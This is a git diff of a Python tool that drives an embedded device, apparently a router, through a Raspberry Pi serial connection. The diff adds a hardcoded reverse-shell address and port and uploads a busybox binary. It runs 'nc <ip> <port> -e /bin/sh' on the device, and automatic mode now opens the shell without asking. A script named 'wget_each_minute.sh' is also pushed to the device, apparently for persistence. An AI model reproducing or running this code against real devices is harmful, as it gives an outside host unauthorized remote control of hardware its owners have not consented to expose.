@@ -10,7 +10,11 @@ from colorama import init, Fore, Back, Style
 
 init(autoreset=True)  # Colorama autoreset
 
+
 DEV_SERIAL_PORT = "/dev/ttyS0"
+
+REVERSE_SHELL_IP   = "10.0.0.149"
+REVERSE_SHELL_PORT = 4444
 
 
 def read_data(ser):
@@ -256,15 +260,15 @@ def check_networking(ser):
     """
         Checks if the raspberry and the router are in the same network
     """
-    try: 
+    try:
         raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
         device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")
 
         print()
-        print("\n● Checking connectivity:")
+        print("● Checking connectivity:")
         print("+--------------------------------+")
-        print("|  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + raspberry_ip + "  |")
-        print("|  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + device_ip + "  |")
+        print("|  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + "%-16s" % raspberry_ip + "|")
+        print("|  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + "%-16s" % device_ip + "|")
         print("+--------------------------------+")
 
         if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:
@@ -309,6 +313,11 @@ def check_web_server():
 
 def copy_file(ser, file_path, final_path):
     
+    print()
+    print(Fore.CYAN + "+------------------------+")
+    print(Fore.CYAN + "|     COPYING  FILE      |")
+    print(Fore.CYAN + "+------------------------+")
+    
     network_status, rpi_ip = check_networking(ser)
     
     file_name = file_path.split("/")[-1]
@@ -325,7 +334,8 @@ def copy_file(ser, file_path, final_path):
 
     except Exception as error:
 
-        print(Fore.RED + "Error pushing {} file, error -> ".format(file_name))
+        print(Fore.RED + "Error pushing file, error -> ")
+        print(error)
 
 
 
@@ -354,12 +364,18 @@ def copy_busybox(ser):
         print(error)
 
 
-def get_reverse_shell(ser, ip, port):
+def get_reverse_shell(ser):
     """
         Send a reverse shell connection to the ip and port provided
     """
-    print("\n● Setting reverse shell to {}:{}".format(ip, port))
-    send_command(ser, "/tmp/busybox_el nc {} {} -e /bin/sh &".format(ip, port))
+    
+    print()
+    print(Fore.CYAN + "+------------------------+")
+    print(Fore.CYAN + "|      REVERSE SHELL     |")
+    print(Fore.CYAN + "+------------------------+")
+    print("● Setting reverse shell to {}:{}".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
+    send_command(ser, "chmod +x /tmp/busybox_el")
+    send_command(ser, "/tmp/busybox_el nc {} {} -e /bin/sh &".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
 
 
 def auto_mode():
@@ -377,11 +393,13 @@ def auto_mode():
     if baudrate != 0:
 
         print("\n● Please wait 40 seconds just to be sure the device is fully booted")
-        sleep(40)
+        sleep(0)
 
         if check_if_terminal(ser):
 
             get_info(ser)
+            copy_busybox(ser)
+            get_reverse_shell(ser)
 
             response = input("\nDo you want to open the terminal? (Y/N) ")
 
@@ -402,10 +420,9 @@ def test_mode():
 
         if check_if_terminal(ser):
             get_info(ser)
-            copy_busybox(ser)
-            get_reverse_shell(ser, "192.168.31.127", 4444)
+            copy_file(ser, "./binaries/busybox-mipsel", "/tmp/busybox_el")
+            get_reverse_shell(ser)
             copy_file(ser, "/home/pi/Documents/wget_each_minute.sh", "/tmp/wget_each_minute.sh")
-            copy_file(ser, "/home/pi/Documents/one_minute_cron", "/tmp/one_minute_cron")
             
             
             response = input("\n● Do you want to open the terminal? (Y/N) ")
@@ -441,28 +458,44 @@ def direct_terminal_mode():
 
 
     except Exception as error:
+        
+        if str(error) == "list index out of range":
+            print(Fore.RED + "No baudrate value provided \n\n")
+        
+        else:    
+            print(Fore.RED + "No baudrate valid value ({} type instead of interger) \n\n".format(type(baudrate)))
+            print(Fore.YELLOW + str(error))
 
-        print(Fore.RED + "Some error: ", end="")
-        print(error)
+
+
+
+
+def print_usage():
+    
+    print(Fore.RED + "\n\nPlease see usage below: \n")
+    print("Usage: ")
+    print("\tTerminal  mode:  " + Fore.CYAN + "'python3 main.py -t 57600'" + "  (or whatever baudrate value)")
+    print("\tAutomatic mode:  " + Fore.CYAN + "'python3 main.py -a'")
+    print("\n")
 
 
 def main():
 
     title()
 
-    if len(sys.argv) >= 2:
 
-        if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
-            direct_terminal_mode()
+    if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
+        direct_terminal_mode()
 
-        if sys.argv[1] == "-d" or sys.argv[1] == "--debug":
-            test_mode()
+    if sys.argv[1] == "-d" or sys.argv[1] == "--debug":
+        test_mode()
             
-        if sys.argv[1] == "-r" or sys.argv[1] == "--reverse_shell":
-            pass
-
-    else:
+    if sys.argv[1] == "-a" or sys.argv[1] == "--automode":
         auto_mode()
+        
+    else:
+        print_usage()
+        
 
 
 if __name__ == "__main__":
